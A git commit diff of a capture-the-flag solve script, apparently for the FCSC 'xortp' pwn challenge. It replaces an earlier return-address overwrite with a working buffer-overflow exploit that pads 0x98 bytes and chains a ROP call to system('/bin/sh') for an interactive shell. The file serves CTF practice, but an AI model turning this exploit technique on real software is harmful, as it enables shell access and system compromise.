5551d73d938438a0a814198cb997a0ff83c725b9
Lenoctambule <106790775+lenoctambule@users.noreply.github.com>
2025-04-22 19:03:23 +0200

    feat(xortp): final functional exploit

--- pwn/xortp/solve.py
+++ pwn/xortp/solve.py
@@ -3,33 +3,23 @@ from pwn import *
 PATH = "./src/xortp"
 REMOTE = "chall.fcsc.fr"
 PORT = 2105
+
 context.binary = elf = ELF(PATH)
 context.log_level = "debug"
 
-r = process(PATH)
+rop = ROP(elf)
+cmd = next(elf.search(b'/bin/sh'))
+ret_gadget = rop.find_gadget(['ret'])[0]
+
+print("Address of '/bin/sh' : ", hex(cmd))
+
+rop.raw(ret_gadget)
+rop.call("system", [cmd])
+
+payload = b"\x00" * (0x98) + rop.chain()
+
+r = process("./src/xortp")
 # r = remote(REMOTE, PORT)
 
-gdb.attach(r, gdbscript="""
-                        add-symbol-file ./src/xortp
-                        set disable-randomization off
-                        c
-                        """)
-
-path_pl = b"./src/flag.txt"
-# path_pl = b"/dev/urandom"
-# path_pl = b"./src/xortp"
-# path_pl = b"flag.txt"
-
-target = p64(elf.symbols["main"] + 1)
-
-
-payload = path_pl + b"\x00" * (0x98 - len(path_pl)) + target
-
-r.recvuntil("encrypt?\n")
-r.sendline(payload)
-# r.sendline("\x00" * 128)
-print(len(bytes.fromhex(r.recvline().decode())))
-r.recvuntil("encrypt?\n")
-r.sendline(payload)
-print(len(bytes.fromhex(r.recvline().decode())))
-
+r.sendlineafter(b"encrypt?\n", payload)
+r.interactive()
